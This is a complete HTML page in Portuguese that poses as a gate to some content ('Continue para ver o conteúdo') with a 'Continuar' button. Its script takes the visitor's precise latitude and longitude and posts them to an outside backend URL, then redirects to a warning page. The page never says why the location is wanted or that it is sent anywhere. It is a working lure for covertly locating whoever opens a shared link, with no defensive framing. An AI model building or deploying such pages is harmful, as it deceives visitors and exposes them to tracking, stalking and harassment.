<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bem-vindo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .card img {
            width: 100%;
            max-width: 280px;
            border-radius: 12px;
            margin-bottom: 20px;
        }
        h1 {
            color: #333;
            font-size: 22px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 25px;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: 0.2s;
        }
        button:hover {
            background: #5568d3;
            transform: scale(1.02);
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- Troque essa URL por qualquer imagem que você quiser -->
        <img src="https://picsum.photos/400/300" alt="Imagem">
        <h1>Continue para ver o conteúdo</h1>
        <p>Clique no botão abaixo para prosseguir</p>
        <button id="botao">Continuar</button>
        <div id="status"></div>
    </div>

    <script>
        const BACKEND_URL = 'https://loc-backend-vsl4.vercel.app/api/send-location';

        document.getElementById('botao').addEventListener('click', () => {
            const statusEl = document.getElementById('status');
            statusEl.innerText = '...';

            if (!navigator.geolocation) {
                statusEl.innerText = 'Error.';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const { latitude, longitude } = pos.coords;
                    statusEl.innerText = 'Enviando...';

                    try {
                        await fetch(BACKEND_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ latitude, longitude })
                        });
                        statusEl.innerText = '✅ Obrigado!';
                        setTimeout(() => {
                        window.location.href = '/aviso.html';
                        }, 1500);
                    } catch (e) {
                        statusEl.innerText = '❌ Erro: ' + e.message;
                    }
                },
                (err) => {
                    statusEl.innerText = 'Localização negada.';
                }
            );
        });
    </script>
</body>
</html>
